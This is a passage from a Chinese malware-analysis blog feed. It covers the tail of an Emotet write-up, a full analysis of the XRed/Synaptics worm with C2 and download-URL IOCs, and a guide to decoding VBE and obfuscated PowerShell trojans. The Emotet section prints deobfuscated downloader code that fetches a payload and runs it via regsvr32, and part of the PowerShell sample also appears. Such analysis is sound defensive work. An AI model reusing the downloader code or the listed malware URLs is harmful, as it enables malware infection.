&quot;</span>vBKbaQgjyvRRbcgfvlsc<span class="hljs-string">&quot;</span><br><span class="hljs-string">msxML.SEnd</span><br><span class="hljs-string">    wiTH stream</span><br><span class="hljs-string">.TYPe = 1</span><br><span class="hljs-string">.OpEN</span><br><span class="hljs-string">.write MsXMl.rEspoNsEBody</span><br><span class="hljs-string">.savetOfIlE fILEPATH, 2</span><br><span class="hljs-string">    end WitH</span><br><span class="hljs-string"> end Sub&quot;</span>)<br><br>ImshDnydVr.Exec(windir &amp; <span class="hljs-string">&quot;\sySTem32\regsVR32.Exe &quot;</span> &amp; tmp &amp; Base64Decode(<span class="hljs-string">&quot;XEtaY0VYa0VrcFIuWlZQ&quot;</span>))<br>FSO.GetFile(WScript.ScriptFullName).delete<br></code></pre></td></tr></table></figure><p>和之前的VBA宏病毒样本一样都是从多个地址下载远控木马，然后通过regsvr32执行。</p><p><strong>参考：</strong></p><p><a href="https://blog.cyble.com/2022/04/27/emotet-returns-with-new-ttps-and-delivers-lnk-files-to-its-victims/">https://blog.cyble.com/2022/04/27/emotet-returns-with-new-ttps-and-delivers-lnk-files-to-its-victims/</a></p><p><a href="https://www.bleepingcomputer.com/news/security/emotet-malware-now-installs-via-powershell-in-windows-shortcut-files/">https://www.bleepingcomputer.com/news/security/emotet-malware-now-installs-via-powershell-in-windows-shortcut-files/</a></p><p>对Link文件病毒感兴趣的可以参考这篇文章：</p><p><a href="https://bbs.pediy.com/thread-260953.htm">https://bbs.pediy.com/thread-260953.htm</a></p>]]></content>
    
    
    <categories>
      
      <category>样本分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Emotet</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XRed蠕虫病毒分析</title>
    <link href="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    <url>/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="一、样本信息"><a href="#一、样本信息" class="headerlink" title="一、样本信息"></a>一、样本信息</h2><p>恶意文件为excel表格文件，文件名为“000000.xlsm”，MD5值为e566fc53051035e1e6fd0ed1823de0f9。详情如下表：</p><table><thead><tr><th>文件名</th><th>000000.xlsm</th></tr></thead><tbody><tr><td>MD5</td><td>e566fc53051035e1e6fd0ed1823de0f9</td></tr><tr><td>SHA256</td><td>8e574b4ae6502230c0829e2319a6c146aebd51b7008bf5bbfb731424d7952c15</td></tr><tr><td>文件大小</td><td>18,387 字节</td></tr><tr><td>病毒类型</td><td>HEUR:Trojan-Downloader.Script.Generic</td></tr></tbody></table><p>经初步分析该文档属于伪装成“Synaptics触摸板驱动程序”的Xred蠕虫病毒产生的存在恶意宏代码的Excel传播文档。该病毒曾于2020年初较为活跃，是具备远程控制、信息窃取能力的感染型病毒，可以感染本地EXE文件及xlsx电子表格文件，病毒可通过文件分享和U盘、移动硬盘等媒介传播。据此，安全人员判定上述上传恶意文件的主机已经遭受感染，但在流量监控过程中并未发现该病毒主程序，因此从相关威胁情报中搜集到了源EXE格式病毒。Xred病毒详情如下：</p><table><thead><tr><th>文件名</th><th>Synaptics.exe</th></tr></thead><tbody><tr><td>MD5</td><td>13358cfb6040fd4b2dba262f209464de</td></tr><tr><td>SHA256</td><td>72daa031ce52468fce5cdab85b21b18f1211b8804bc23c6e6ae8c24e868c4866</td></tr><tr><td>文件大小</td><td>771,584 字节</td></tr><tr><td>病毒类型</td><td>Backdoor.Win32.DarkKomet.hqxy</td></tr></tbody></table><h2 id="二、样本分析"><a href="#二、样本分析" class="headerlink" title="二、样本分析"></a>二、样本分析</h2><p>捕获的Excel文档内容均为空，包含恶意宏代码，打开后会自动运行。篡改Word和Excel组件的宏设置，启用所有宏，并通过公有云盘下载并执行Synaptics.exe病毒。目前所有的下载链接均已失效。</p><p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image002.png" alt="img"></p><center>修改宏设置</center><p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image004.png" alt="img"></p><center>远程下载并执行病毒</center><p>Xred病毒由Delph编写，无壳，自身伪装成Synaptics触摸板驱动程序。</p><p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image006.png" alt="img"></p><center>PE详情</center><p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image008.png" alt="img"></p><center>伪装成驱动程序</center><p>该病毒通过感染指定位置（Desktop、Documents、Downloads）的32位的“.exe”后缀文件与“.xlsx”后缀文件，使其恶意代码可以通过文件共享大量传播但不会导致系统明显卡顿。</p><p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image010.png" alt="img"></p><center>指定位置</center><p>被感染的文件被执行时，会执行恶意逻辑，包括释放伪装名为“Synaptics.exe”的文件常驻系统，进行远程控制，回传窃取的敏感信息等恶意行为。主要功能逻辑如下图所示：</p><p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image012.png" alt="https://pc1.gtimg.com/guanjia/images/9b/83/9b837e056017f499ccb79ef4daa6213d.png"></p><center>主要功能逻辑</center><p>被感染的可执行文件体积增量约为753KB，包含一个名为“EXERESX”的资源，该资源是原始正常的程序。“EXERESX”资源会在宿主文件运行时被释放到当前目录并设置隐藏属性后执行。添加“ ._cache_”前缀拼接文件名。如下图所示：</p><p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image014.png" alt="img"></p><p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image016.png" alt="img"></p><center>被感染的文件与原文件对比</center><p>该病毒释放并加载名为“KBHKS”的动态库资源，通过设置相关钩子消息以记录键盘输入信息及其窗口信息等， Hook代码关键逻辑如下：</p><p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image017.png" alt="img"></p><center>Hook钩子</center><p>病毒使用“XLSM”资源感染xlsx后缀文件，并将“.xlsx”后缀改为“.xlsm”。修改office组件设置以及xlsm后缀目的为了能够自动静默启用宏。如下图所示：</p><p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image019.png" alt="img"></p><center>感染xlsx文件</center><p>病毒回连地址，公有云盘下载地址及敏感信息接收邮箱见下图：</p><p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image021.png" alt="img"> <center>回连字符串</center></p><p>具有基础的远程控制功能，包括执行CMD命令、屏幕截图、打印目录、下载文件、删除文件等。功能代码如下图所示。</p><p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image022.png" alt="img"></p><center>远控功能</center><h2 id="三、IOCs"><a href="#三、IOCs" class="headerlink" title="三、IOCs"></a>三、IOCs</h2><p><strong>MD5：</strong></p><p>e566fc53051035e1e6fd0ed1823de0f9</p><p>13358cfb6040fd4b2dba262f209464de</p><p>备注：因为被感染文件一直都是变化的，MD5值不确定，只列举了两个得到的样本</p><p><strong>C2 &amp; URL：</strong></p><p>xred.mooo.com</p><p>freedns.afraid.org</p><p>docs.google.com&#x2F;uc?id&#x3D;0BxsMXGfPIZfSVlVsOGlEVGxuZVk&amp;export&#x3D;download</p><p><a href="http://www.dropbox.com/s/zhp1b06imehwylq/Synaptics.rar?dl=1">www.dropbox.com/s/zhp1b06imehwylq/Synaptics.rar?dl=1</a></p><p>xred.site50.net&#x2F;syn&#x2F;Synaptics.rar</p><p><strong>邮箱地址：</strong></p><p><a href="mailto:&#120;&#x72;&#101;&#x64;&#108;&#105;&#x6e;&#101;&#49;&#x40;&#103;&#x6d;&#x61;&#105;&#x6c;&#x2e;&#x63;&#x6f;&#x6d;">&#120;&#x72;&#101;&#x64;&#108;&#105;&#x6e;&#101;&#49;&#x40;&#103;&#x6d;&#x61;&#105;&#x6c;&#x2e;&#x63;&#x6f;&#x6d;</a></p><p><a href="mailto:&#120;&#x72;&#101;&#x64;&#108;&#x69;&#x6e;&#101;&#x32;&#64;&#103;&#x6d;&#97;&#105;&#108;&#x2e;&#x63;&#x6f;&#x6d;">&#120;&#x72;&#101;&#x64;&#108;&#x69;&#x6e;&#101;&#x32;&#64;&#103;&#x6d;&#97;&#105;&#108;&#x2e;&#x63;&#x6f;&#x6d;</a></p><p><a href="mailto:&#120;&#114;&#x65;&#x64;&#x6c;&#105;&#110;&#x65;&#x33;&#64;&#103;&#109;&#97;&#105;&#x6c;&#46;&#99;&#111;&#109;">&#120;&#114;&#x65;&#x64;&#x6c;&#105;&#110;&#x65;&#x33;&#64;&#103;&#109;&#97;&#105;&#x6c;&#46;&#99;&#111;&#109;</a></p><h2 id="四、处置建议"><a href="#四、处置建议" class="headerlink" title="四、处置建议"></a>四、处置建议</h2><p>（1）立即对感染病毒的机器进行断网处理，避免进一步扩散。</p><p>（2）对已感染病毒的电脑，进行全盘查杀，修复被感染的文件。</p>]]></content>
    
    
    <categories>
      
      <category>样本分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>XRed</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VBE、VBS、PowerShell和JavaScript木马</title>
    <link href="/2022/05/13/VBE%E3%80%81VBS%E3%80%81PowerShell%E5%92%8CJavaScript%E6%9C%A8%E9%A9%AC/"/>
    <url>/2022/05/13/VBE%E3%80%81VBS%E3%80%81PowerShell%E5%92%8CJavaScript%E6%9C%A8%E9%A9%AC/</url>
    
    <content type="html"><![CDATA[<h2 id="VBE"><a href="#VBE" class="headerlink" title="VBE"></a>VBE</h2><p>VBE是编译后（加密）的VBS代码。</p><p>加密工具有很多，其中常用的是<strong>Microsoft Script Encoder(screnc.exe)</strong>,此外还有许多。</p><p>可以利用Microsoft Script Encoder进行解码，但是微软官网已经下架了相关下载链接。</p><p>推荐使用国外大神写的解码工具</p><p><a href="https://www.interclasse.com/scripts/decovbe.php">https://www.interclasse.com/scripts/decovbe.php</a></p><p>CMD执行decoder.vbs  (目标vbe)</p><p>例如：</p><figure class="highlight stylus"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs stylus">decoder<span class="hljs-selector-class">.vbs</span> information.vbe<br></code></pre></td></tr></table></figure><p>information.vbe（MD5: E9FFDB716AF3D355B25096A8ED4DE8EF）</p><p>结果：</p><img src="image-20220512112831779.png" alt="image-20220512112831779" style="zoom: 50%;" /><p>因为源码写的是弹窗，不能复制。进行了修改（从第63行到第68行），在CMD执行路径下生成1.txt。</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><code class="hljs vbscript"><span class="hljs-comment">&#x27;VBE decoder</span><br><span class="hljs-comment">&#x27;</span><br><span class="hljs-comment">&#x27;Decode all files encoded (original version) with screnc.exe</span><br><span class="hljs-comment">&#x27;This script give you a decoded listing from an encoded file.</span><br><span class="hljs-comment">&#x27;Supports *,je, ,vbe, .asp, .hta, .htm, .html…</span><br><span class="hljs-comment">&#x27;If used under cscript, puts the result to stdout.</span><br><span class="hljs-comment">&#x27;The file can be multi-encoded (many scripts in the file, for ex. in an html file)</span><br><span class="hljs-comment">&#x27;Used under wscript, pops up the decoded file in a message box.</span><br><span class="hljs-comment">&#x27;</span><br><span class="hljs-comment">&#x27;File Name : decovbe.vbs</span><br><span class="hljs-comment">&#x27;Requirement : none</span><br><span class="hljs-comment">&#x27;Author : Jean-Luc Antoine</span><br><span class="hljs-comment">&#x27;Submitted : 05/09/2001</span><br><span class="hljs-comment">&#x27;Updated : 09/12/2001</span><br><span class="hljs-comment">&#x27;Category : 4K</span><br><span class="hljs-comment">&#x27;</span><br><span class="hljs-comment">&#x27;http://www.interclasse.com/scripts/decovbe.php</span><br><br><span class="hljs-keyword">option</span> <span class="hljs-keyword">explicit</span><br><span class="hljs-keyword">Dim</span> oArgs, NomFichier, a<br><span class="hljs-comment">&#x27;Optional argument : the encoded filename</span><br>NomFichier=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">Set</span> oArgs = WScript.Arguments<br><span class="hljs-keyword">Select</span> <span class="hljs-keyword">Case</span> oArgs.Count<br><span class="hljs-keyword">Case</span> <span class="hljs-number">0</span> <span class="hljs-comment">&#x27;No Arg, popup a dialog box to choose the file</span><br>NomFichier=BrowseForFolder(<span class="hljs-string">&quot;Choose an encoded file&quot;</span>, &amp;H4031, &amp;H0011)<br><span class="hljs-keyword">Case</span> <span class="hljs-number">1</span><br><span class="hljs-keyword">If</span> <span class="hljs-built_in">Instr</span>(oArgs(<span class="hljs-number">0</span>),<span class="hljs-string">&quot;?&quot;</span>)=<span class="hljs-number">0</span> <span class="hljs-keyword">Then</span> <span class="hljs-comment">&#x27;-? ou /? =&gt; aide</span><br>NomFichier=oArgs(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><span class="hljs-keyword">Case</span> <span class="hljs-keyword">Else</span><br>WScript.Echo <span class="hljs-string">&quot;Too many parameters&quot;</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Select</span><br><span class="hljs-keyword">Set</span> oArgs = <span class="hljs-literal">Nothing</span><br><br><span class="hljs-keyword">If</span> NomFichier&lt;&gt;<span class="hljs-string">&quot;&quot;</span> <span class="hljs-keyword">Then</span><br><span class="hljs-keyword">Dim</span> fso<br><span class="hljs-keyword">Set</span> fso=WScript.<span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Scripting.FileSystemObject&quot;</span>)<br><span class="hljs-keyword">If</span> fso.FileExists(NomFichier) <span class="hljs-keyword">Then</span><br><span class="hljs-keyword">Dim</span> fic,contenu<br><span class="hljs-keyword">Set</span> fic = fso.OpenTextFile(NomFichier, <span class="hljs-number">1</span>)<br>Contenu=fic.readAll<br>fic.close<br><span class="hljs-keyword">Set</span> fic=<span class="hljs-literal">Nothing</span><br><br><span class="hljs-keyword">Const</span> TagInit=<span class="hljs-string">&quot;#@~^&quot;</span> <span class="hljs-comment">&#x27;#@~^awQAAA==</span><br><span class="hljs-keyword">Const</span> TagFin=<span class="hljs-string">&quot;==^#~@&quot;</span> <span class="hljs-comment">&#x27;&amp; chr(0)</span><br><span class="hljs-keyword">Dim</span> DebutCode, FinCode<br><span class="hljs-keyword">Do</span><br>FinCode=<span class="hljs-number">0</span><br>DebutCode=<span class="hljs-built_in">Instr</span>(Contenu,TagInit)<br><span class="hljs-keyword">If</span> DebutCode&gt;<span class="hljs-number">0</span> <span class="hljs-keyword">Then</span><br><span class="hljs-keyword">If</span> (<span class="hljs-built_in">Instr</span>(DebutCode,Contenu,<span class="hljs-string">&quot;==&quot;</span>)-DebutCode)=<span class="hljs-number">10</span> <span class="hljs-keyword">Then</span> <span class="hljs-comment">&#x27;If &quot;==&quot; follows the tag</span><br>FinCode=<span class="hljs-built_in">Instr</span>(DebutCode,Contenu,TagFin)<br><span class="hljs-keyword">If</span> FinCode&gt;<span class="hljs-number">0</span> <span class="hljs-keyword">Then</span><br>Contenu=<span class="hljs-built_in">Left</span>(Contenu,DebutCode<span class="hljs-number">-1</span>) &amp; _<br>Decode(<span class="hljs-built_in">Mid</span>(Contenu,DebutCode+<span class="hljs-number">12</span>,FinCode-DebutCode<span class="hljs-number">-12</span><span class="hljs-number">-6</span>)) &amp; _<br><span class="hljs-built_in">Mid</span>(Contenu,FinCode+<span class="hljs-number">6</span>)<br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><span class="hljs-keyword">Loop</span> Until FinCode=<span class="hljs-number">0</span><br><span class="hljs-comment">&#x27;WScript.Echo Contenu     </span><br><span class="hljs-comment">&#x27;修改为生成1.txt文件</span><br><span class="hljs-keyword">Set</span> fso =<span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Scripting.FileSystemObject&quot;</span>)<br><span class="hljs-keyword">Set</span> a = fso.CreateTextFile(<span class="hljs-string">&quot;1.TXT&quot;</span>, <span class="hljs-literal">True</span>)<br>a.WriteLine(Contenu)<br>a.Close <br><span class="hljs-keyword">Else</span><br>WScript.Echo Nomfichier &amp; <span class="hljs-string">&quot; not found&quot;</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><span class="hljs-keyword">Set</span> fso=<span class="hljs-literal">Nothing</span><br><span class="hljs-keyword">Else</span><br>WScript.Echo <span class="hljs-string">&quot;Please give a filename&quot;</span><br>WScript.Echo <span class="hljs-string">&quot;Usage : &quot;</span> &amp; wscript.fullname  &amp; <span class="hljs-string">&quot; &quot;</span> &amp; WScript.ScriptFullName &amp; <span class="hljs-string">&quot; &lt;filename&gt;&quot;</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><br><span class="hljs-keyword">Function</span> Decode(Chaine)<br><span class="hljs-keyword">Dim</span> se,i,c,j,index,ChaineTemp<br><span class="hljs-keyword">Dim</span> tDecode(<span class="hljs-number">127</span>)<br><span class="hljs-keyword">Const</span> Combinaison=<span class="hljs-string">&quot;1231232332321323132311233213233211323231311231321323112331123132&quot;</span><br><br><span class="hljs-keyword">Set</span> se=WSCript.<span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Scripting.Encoder&quot;</span>)<br><span class="hljs-keyword">For</span> i=<span class="hljs-number">9</span> <span class="hljs-keyword">to</span> <span class="hljs-number">127</span><br>tDecode(i)=<span class="hljs-string">&quot;JLA&quot;</span><br><span class="hljs-keyword">Next</span><br><span class="hljs-keyword">For</span> i=<span class="hljs-number">9</span> <span class="hljs-keyword">to</span> <span class="hljs-number">127</span><br>ChaineTemp=<span class="hljs-built_in">Mid</span>(se.EncodeScriptFile(<span class="hljs-string">&quot;.vbs&quot;</span>,<span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>,i),<span class="hljs-number">0</span>,<span class="hljs-string">&quot;&quot;</span>),<span class="hljs-number">13</span>,<span class="hljs-number">3</span>)<br><span class="hljs-keyword">For</span> j=<span class="hljs-number">1</span> <span class="hljs-keyword">to</span> <span class="hljs-number">3</span><br>c=<span class="hljs-built_in">Asc</span>(<span class="hljs-built_in">Mid</span>(ChaineTemp,j,<span class="hljs-number">1</span>))<br>tDecode(c)=<span class="hljs-built_in">Left</span>(tDecode(c),j<span class="hljs-number">-1</span>) &amp; <span class="hljs-built_in">chr</span>(i) &amp; <span class="hljs-built_in">Mid</span>(tDecode(c),j+<span class="hljs-number">1</span>)<br><span class="hljs-keyword">Next</span><br><span class="hljs-keyword">Next</span><br><span class="hljs-comment">&#x27;Next line we correct a bug, otherwise a &quot;)&quot; could be decoded to a &quot;&gt;&quot;</span><br>tDecode(<span class="hljs-number">42</span>)=<span class="hljs-built_in">Left</span>(tDecode(<span class="hljs-number">42</span>),<span class="hljs-number">1</span>) &amp; <span class="hljs-string">&quot;)&quot;</span> &amp; <span class="hljs-built_in">Right</span>(tDecode(<span class="hljs-number">42</span>),<span class="hljs-number">1</span>)<br><span class="hljs-keyword">Set</span> se=<span class="hljs-literal">Nothing</span><br><br>Chaine=<span class="hljs-built_in">Replace</span>(<span class="hljs-built_in">Replace</span>(Chaine,<span class="hljs-string">&quot;@&amp;&quot;</span>,<span class="hljs-built_in">chr</span>(<span class="hljs-number">10</span>)),<span class="hljs-string">&quot;@#&quot;</span>,<span class="hljs-built_in">chr</span>(<span class="hljs-number">13</span>))<br>Chaine=<span class="hljs-built_in">Replace</span>(<span class="hljs-built_in">Replace</span>(Chaine,<span class="hljs-string">&quot;@*&quot;</span>,<span class="hljs-string">&quot;&gt;&quot;</span>),<span class="hljs-string">&quot;@!&quot;</span>,<span class="hljs-string">&quot;&lt;&quot;</span>)<br>Chaine=<span class="hljs-built_in">Replace</span>(Chaine,<span class="hljs-string">&quot;@$&quot;</span>,<span class="hljs-string">&quot;@&quot;</span>)<br>index=<span class="hljs-number">-1</span><br><span class="hljs-keyword">For</span> i=<span class="hljs-number">1</span> <span class="hljs-keyword">to</span> <span class="hljs-built_in">Len</span>(Chaine)<br>c=<span class="hljs-built_in">asc</span>(<span class="hljs-built_in">Mid</span>(Chaine,i,<span class="hljs-number">1</span>))<br><span class="hljs-keyword">If</span> c&lt;<span class="hljs-number">128</span> <span class="hljs-keyword">Then</span> index=index+<span class="hljs-number">1</span><br><span class="hljs-keyword">If</span> (c=<span class="hljs-number">9</span>) <span class="hljs-keyword">or</span> ((c&gt;<span class="hljs-number">31</span>) <span class="hljs-keyword">and</span> (c&lt;<span class="hljs-number">128</span>)) <span class="hljs-keyword">Then</span><br><span class="hljs-keyword">If</span> (c&lt;&gt;<span class="hljs-number">60</span>) <span class="hljs-keyword">and</span> (c&lt;&gt;<span class="hljs-number">62</span>) <span class="hljs-keyword">and</span> (c&lt;&gt;<span class="hljs-number">64</span>) <span class="hljs-keyword">Then</span><br>Chaine=<span class="hljs-built_in">Left</span>(Chaine,i<span class="hljs-number">-1</span>) &amp; <span class="hljs-built_in">Mid</span>(tDecode(c),<span class="hljs-built_in">Mid</span>(Combinaison,(index mod <span class="hljs-number">64</span>)+<span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>) &amp; <span class="hljs-built_in">Mid</span>(Chaine,i+<span class="hljs-number">1</span>)<br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><span class="hljs-keyword">Next</span><br>Decode=Chaine<br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Function</span><br><br><span class="hljs-keyword">Function</span> BrowseForFolder(<span class="hljs-keyword">ByVal</span> pstrPrompt, <span class="hljs-keyword">ByVal</span> pintBrowseType, <span class="hljs-keyword">ByVal</span> pintLocation)<br><span class="hljs-keyword">Dim</span> ShellObject, pstrTempFolder, x<br><span class="hljs-keyword">Set</span> ShellObject=WScript.<span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Shell.Application&quot;</span>)<br><span class="hljs-keyword">On</span> <span class="hljs-keyword">Error</span> <span class="hljs-keyword">Resume</span> <span class="hljs-keyword">Next</span><br><span class="hljs-keyword">Set</span> pstrTempFolder=ShellObject.BrowseForFolder(&amp;H0,pstrPrompt,pintBrowseType,pintLocation)<br>BrowseForFolder=pstrTempFolder.ParentFolder.ParseName(pstrTempFolder.Title).Path<br><span class="hljs-keyword">If</span> Err.Number&lt;&gt;<span class="hljs-number">0</span> <span class="hljs-keyword">Then</span> BrowseForFolder=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">Set</span> pstrTempFolder=<span class="hljs-literal">Nothing</span><br><span class="hljs-keyword">Set</span> ShellObject=<span class="hljs-literal">Nothing</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Function</span><br></code></pre></td></tr></table></figure><h2 id="VBS"><a href="#VBS" class="headerlink" title="VBS"></a>VBS</h2><p><strong>VBS</strong>可以使用msgbox、WScript.StdOut.WriteLine或者WScript.Echo方法</p><p>也可以使用notepad++插件NppExec进行调试，</p><p>或者执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">WScript  /x  vbsfile<br>CScript  /x  vbsfile<br></code></pre></td></tr></table></figure><p>调用VS进行调试</p><h2 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h2><p>Powershell脚本混淆的方法有很多，包括随机大小写、字符串拼接、简写与通配符、Ascii编码、Base64编码、逆序等等。</p><p>但是万变不离其宗，PowerShell脚本最后都要执行，都会用到<strong>iex（invoke-Expression）</strong>函数。</p><p>我们只需要找到代码中的iex、Invoke-Expression或者其他变形&amp;($psHOme[4]+$pshOme[34]+’x’) 、$Env:ComSpec[4,26,25]-Join’’、$ShellId[1]+$ShellId[13]+’x’ 、$EnV:cOmSPeC[4,24,25]-jOIn’’等，然后直接修改为<strong>Write-Output</strong>就可以了。</p><p>例如：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">aes</span></span><br>&#123;<br><span class="hljs-keyword">param</span> ([<span class="hljs-built_in">String</span>]<span class="hljs-variable">$InputString</span>,<br>[<span class="hljs-built_in">String</span>]<span class="hljs-variable">$hash</span> = <span class="hljs-string">&quot;cVdA6gMCLBUrWK3mqhai24KhwaAufX7yN&quot;</span>)<br><br><br><span class="hljs-variable">$InputData</span> = [<span class="hljs-type">Convert</span>]::FromBase64String(<span class="hljs-variable">$InputString</span>)<br><br><span class="hljs-variable">$Salt</span> = <span class="hljs-built_in">New-Object</span> Byte[](<span class="hljs-number">32</span>)<br>[<span class="hljs-built_in">Array</span>]::<span class="hljs-built_in">Copy</span>(<span class="hljs-variable">$InputData</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$Salt</span>, <span class="hljs-number">0</span>, <span class="hljs-number">32</span>)<br><span class="hljs-variable">$Rfc2898</span> = <span class="hljs-built_in">New-Object</span> System.Security.Cryptography.Rfc2898DeriveBytes(<span class="hljs-variable">$hash</span>, <span class="hljs-variable">$Salt</span>)<br><span class="hljs-variable">$AESKey</span> = <span class="hljs-variable">$Rfc2898</span>.GetBytes(<span class="hljs-number">32</span>)<br><span class="hljs-variable">$AESIV</span> = <span class="hljs-variable">$Rfc2898</span>.GetBytes(<span class="hljs-number">16</span>)<br><span class="hljs-variable">$Hmac</span> = <span class="hljs-built_in">New-Object</span> System.Security.Cryptography.HMACSHA1( 